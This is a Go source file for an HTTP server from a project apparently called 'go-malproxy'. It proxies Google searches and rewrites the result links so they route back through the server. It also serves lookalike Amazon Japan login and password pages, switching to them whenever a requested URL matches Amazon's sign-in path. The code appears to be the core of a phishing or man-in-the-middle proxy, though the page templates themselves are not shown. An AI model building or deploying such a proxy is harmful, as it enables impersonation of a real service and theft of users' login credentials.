package server

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"strings"
	"text/template"

	"github.com/go-malproxy/server/service"
)

type TemplateExecutor interface {
	ExecuteTemplate(wr io.Writer, name string, data interface{}) error
}

type DebugTemplateExecutor struct {
	Glob string
}

func (e DebugTemplateExecutor) ExecuteTemplate(wr io.Writer, name string, data interface{}) error {
	t := template.Must(template.ParseGlob(e.Glob))
	return t.ExecuteTemplate(wr, name, data)
}

type ReleaseTemplateExecutor struct {
	Template *template.Template
}

func (e ReleaseTemplateExecutor) ExecuteTemplate(wr io.Writer, name string, data interface{}) error {
	return e.Template.ExecuteTemplate(wr, name, data)
}

const templateGlob = "server/templates/*.html"
const debug = true

var executor TemplateExecutor

func Server() {
	if debug {
		executor = DebugTemplateExecutor{templateGlob}

	} else {
		executor = ReleaseTemplateExecutor{
			template.Must(template.ParseGlob(templateGlob)),
		}
	}

	http.HandleFunc("/", IndexHandler)
	http.HandleFunc("/hello", HelloHandler)
	http.HandleFunc("/google", GoogleHandler)
	http.HandleFunc("/amazon-login", AmazonLoginHandler)
	http.HandleFunc("/amazon", AmazonHandler)
	http.HandleFunc("/template", TemplateHandler)

	http.ListenAndServe(":3333", nil)
}

func IndexHandler(w http.ResponseWriter, r *http.Request) { // http://localhost:3333/
	executor.ExecuteTemplate(w, "index", nil)
}

func HelloHandler(w http.ResponseWriter, r *http.Request) { // http://localhost:3333/hello
	executor.ExecuteTemplate(w, "hello", nil)
}

func AmazonLoginHandler(w http.ResponseWriter, r *http.Request) { // http://localhost:3333/amazon-login
	executor.ExecuteTemplate(w, "amazon-login", nil)
}

func AmazonHandler(w http.ResponseWriter, r *http.Request) { // http://localhost:3333/amazon-login-password
	fmt.Println("method:", r.Method)
	executor.ExecuteTemplate(w, "amazon-login-password", nil)
}

func GoogleHandler(w http.ResponseWriter, r *http.Request) { // http://localhost:3333/google
	fmt.Println("method:", r.Method) //リクエストを取得するメソッド
	fmt.Println("検索ワード:", r.FormValue("params"))
	word := r.FormValue("params")
	res, err := service.GoogleSearch(word)
	if err != nil {
		executor.ExecuteTemplate(w, "err", nil)
	}
	fmt.Println("res:", res)
	err = service.RewriteUrlOfGoogleSearch(res)
	if err != nil {
		executor.ExecuteTemplate(w, "err", nil)
	}
	file := "autogen_rewrite_" + res
	fmt.Println("file:", file)
	executor.ExecuteTemplate(w, file, nil)
}

func TemplateHandler(w http.ResponseWriter, r *http.Request) { // http://localhost:3333/template?url=http://mitm.es3/amazon.co.jp
	fmt.Println("\x1b[31mURL:\x1b[0m", r.FormValue("url")) //取得したパラメータの表示
	url := r.FormValue("url")
	if strings.Contains(url, "https://www.amazon.co.jp/ap/signin?openid.pape.max_auth_age"){
		fmt.Println("Amazonログイン")
		executor.ExecuteTemplate(w, "amazon-login", nil)
	}else{
		fmt.Println("メイン操作")
		res, err := service.MainOperation(url)
	    if err != nil {
		    log.Fatal(err)
	    }
	    executor.ExecuteTemplate(w, res, nil)
	}
}
